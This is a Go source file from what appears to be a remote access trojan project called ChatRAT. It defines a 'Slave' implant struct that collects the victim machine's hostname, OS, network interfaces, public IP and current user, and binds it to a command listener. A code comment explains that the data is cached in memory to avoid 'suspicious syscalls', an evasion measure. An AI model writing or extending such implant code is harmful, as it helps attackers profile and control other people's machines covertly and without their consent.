package slave

import (
	"github.com/cyb3rjerry/ChatRAT/pkg/listeners"
	"github.com/lithammer/shortuuid/v4"
	"os/user"
)

type Slave struct {
	ID       string
	Info     *SlaveInfo
	Listener listeners.Listener
}
type SlaveInfo struct {
	Hostname          string
	OS                string
	NetworkInterfaces []*NetworkInterface
	PublicIP          string
	CurrentUser       *user.User
}

func NewSlave[T listeners.ListenerConfig](config T) *Slave {

	s := new(Slave)

	s.ID = shortuuid.New()
	s.Listener = listeners.NewListener(config)

	// This feels weird but is meant to save this information
	// in memory to avoid constantly making suspicious syscalls
	// whenever we need to access this information.
	// We do however still expose the method if we need to
	// dynamically fetch/update the data.
	// In a normal use case, this would be much cleaner
	s.Info = &SlaveInfo{
		Hostname:          s.GetHostname(),
		OS:                s.GetOS(),
		NetworkInterfaces: s.GetNetworkInterfaces(),
		PublicIP:          s.GetPublicIP(),
		CurrentUser:       s.GetCurrentUser(),
	}

	return s
}
